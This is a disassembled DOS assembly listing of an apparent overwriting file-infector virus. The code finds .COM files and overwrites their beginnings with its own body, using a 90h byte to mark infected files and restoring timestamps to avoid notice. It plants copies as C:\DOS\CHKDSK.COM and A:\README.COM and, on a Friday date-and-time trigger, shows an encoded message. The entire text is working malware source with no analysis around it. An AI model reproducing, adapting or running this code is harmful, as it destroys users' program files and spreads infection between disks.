Code        segment byte public
        assume  cs:Code, ds:Code


        org 100h

chkdsk      proc    far

TalkingHeads:
        nop
        mov ah,1Ah
        mov dx,offset OutDTA
        push    cs
        pop ds
        int 21h         ; DOS Services  ah=function 1Ah
                        ;  set DTA(disk xfer area) ds:dx
        mov byte ptr data_6,0
        nop
        mov ah,4Eh      ; Fn Find First File
SearchFiles:
        mov cx,20h
        mov dx,2B2h
        int 21h         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        jc  loc_3           ; Jump if carry Set
        mov dx,offset data_12
        mov al,0C2h
        mov ah,3Dh          ; '='
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        mov FileHandle,ax
        mov bx,ax
        mov ah,57h          ; 'W'
        mov al,0
        int 21h         ; DOS Services  ah=function 57h
                        ;  get file date+time, bx=handle
                        ;   returns cx=time, dx=time
        mov SaveTime,cx
        mov SaveDate,dx
        mov bx,FileHandle
        mov ah,3Fh          ; '?'
        mov cx,1
        mov dx,offset Signature
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, bx=file handle
                        ;   cx=bytes to ds:dx buffer
        cmp byte ptr Signature,90h
        nop
        jz  loc_2           ; Jump if zero
        mov ah,42h          ; 'B'
        mov al,0
        mov bx,FileHandle
        mov cx,0
        mov dx,0
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        mov ah,40h          ; '@'
        mov bx,FileHandle
        mov cx,207h
        mov dx,100h
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file  bx=file handle
                        ;   cx=bytes from ds:dx buffer
        inc data_6
loc_2:
        mov bx,FileHandle
        mov ah,57h          ; 'W'
        mov al,1
        mov dx,SaveDate
        mov cx,SaveTime
        int 21h         ; DOS Services  ah=function 57h
                        ;  set file date+time, bx=handle
                        ;   cx=time, dx=time
        mov bx,FileHandle
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        cmp byte ptr data_6,2
        je  loc_3           ; Jump if equal
        mov ah,4Fh          ; 'O'
        nop
        nop
        jmp SearchFiles
loc_3:
        mov ah,5Bh          ; '['
        mov cx,20h
        mov dx,offset ChkdskFile
        int 21h         ; DOS Services  ah=function 5Bh
                        ;  create new file, name @ ds:dx
                        ;   cx=file attribute bits
        jc  loc_4           ; Jump if carry Set
        mov FileHandle,ax
        mov bx,ax
        mov ah,40h          ; '@'
        mov cx,207h
        mov dx,100h
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file  bx=file handle
                        ;   cx=bytes from ds:dx buffer
        mov bx,FileHandle
        mov ah,57h          ; 'W'
        mov al,1
        mov dx,SaveDate
        mov cx,SaveTime
        int 21h         ; DOS Services  ah=function 57h
                        ;  set file date+time, bx=handle
                        ;   cx=time, dx=time
        mov bx,FileHandle
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
loc_4:
        mov ah,4
        mov al,1        ; This will check to see if drive A:
        mov ch,0        ; is valid.  No errors returned if
        mov cl,1        ; drive is empty.
        mov dh,0
        mov dl,0
        int 13h         ; Disk  dl=drive a  ah=func 04h
                        ;  verify sectors with mem es:bx
                        ;   al=#,ch=cyl,cl=sectr,dh=head
        jc  Trigger_Check           ; Jump if carry Set
        mov ah,5Bh          ; '['
        mov cx,20h
        mov dx,offset ReadMeFile
        int 21h         ; DOS Services  ah=function 5Bh
                        ;  create new file, name @ ds:dx
                        ;   cx=file attribute bits
        jc  Trigger_Check           ; Jump if carry Set
        mov FileHandle,ax
        mov bx,FileHandle
        mov ah,40h          ; '@'
        mov cx,207h
        mov dx,100h
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file  bx=file handle
                        ;   cx=bytes from ds:dx buffer
        mov bx,FileHandle
        mov ah,57h          ; 'W'
        mov al,1
        mov dx,SaveDate
        mov cx,SaveTime
        int 21h         ; DOS Services  ah=function 57h
                        ;  set file date+time, bx=handle
                        ;   cx=time, dx=time
        mov bx,FileHandle
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
Trigger_Check:
        mov ah,2Ah          ; '*'
        int 21h         ; DOS Services  ah=function 2Ah
                        ;  get date, cx=year, dh=month
                        ;   dl=day, al=day-of-week 0=SUN
        cmp al,5
        jne loc_9           ; Jump if not equal
        mov ah,2Ch          ; ','
        int 21h         ; DOS Services  ah=function 2Ch
                        ;  get time, cx=hrs/min, dx=sec
        cmp ch,11h
        jne loc_9           ; Jump if not equal
        mov si,offset data_2
        mov cx,48h

locloop_8:
        lodsb               ; String [si] to al
        sub al,7Fh
        mov ah,2
        mov dl,al
        int 21h         ; DOS Services  ah=function 02h
                        ;  display char dl
        loop    locloop_8       ; Loop if cx > 0

loc_9:
        mov ah,4Ch          ; 'L'
        int 21h         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
data_2      db  0D3h
        db  0E7h

locloop_10:
        call    $-600Bh
;*      loopnz  locloop_7       ;*Loop if zf=0, cx>0

        db  0E0h,0E8h
        in  ax,dx           ; port 1682h ??I/O Non-standard
        cmpsb               ; Cmp [si] to es:[di]
        db  0F3h, 9Fh,0EDh,0EEh
        db   9Fh,0EFh,0E0h,0F1h,0F3h,0F8h
        db  0ABh, 9Fh,0F3h
        db  0E7h,0E8h,0F2h
        db   9Fh,0E0h,0E8h,0EDh,0A6h,0F3h
        db   9Fh,0EDh,0EEh, 9Fh,0E3h,0E8h
        db  0F2h,0E2h,0EEh,0ABh, 9Fh,0F3h
        db  0E7h,0E8h,0F2h, 9Fh,0E0h,0E8h
        db  0EDh,0A6h
        db  0F3h, 9Fh,0EDh,0EEh, 9Fh,0E5h
        db  0EEh,0EEh,0EBh,0E8h,0EDh,0A6h
        db   9Fh,0E0h,0F1h,0EEh,0F4h,0EDh
        db  0E3h,0A0h, 9Fh, 9Fh,0C2h
        db  0EEh,0EFh,0F8h,0F1h,0E8h,0E6h
        db  0E7h,0F3h, 9Fh,0A7h,0C2h,0A8h
        db   9Fh,0B0h,0B8h,0B8h,0B0h, 9Fh
        db  0D3h,0E0h,0EBh,0EAh,0E8h,0EDh
        db  0E6h, 9Fh,0C7h,0E4h,0E0h,0E3h
        db  0F2h, 9Fh,0C5h,0E0h,0EDh, 9Fh
        db  0C2h,0EBh,0F4h,0E1h
SaveTime    dw  2800h
SaveDate    dw  1689h
Signature   db  90h
data_6      db  0
        db   2Ah, 2Eh, 43h, 4Fh, 4Dh, 00h
        db   00h, 00h
FileHandle  dw  5
ChkdskFile  db  'C:\DOS\CHKDSK.COM', 0
ReadMeFile  db  'A:\README.COM', 0
OutDTA      db  3
        db  8 dup (3Fh)
        db   43h, 4Fh, 4Dh, 20h, 2Dh, 00h
        db   00h, 00h,0B2h,0D1h,0D3h, 85h
        db   20h, 00h, 28h, 89h, 16h,0E5h
        db  0BAh, 00h, 00h
data_12     db  'COMMAND.COM', 0
        db  0

chkdsk      endp

Code        ends

        end TalkingHeads
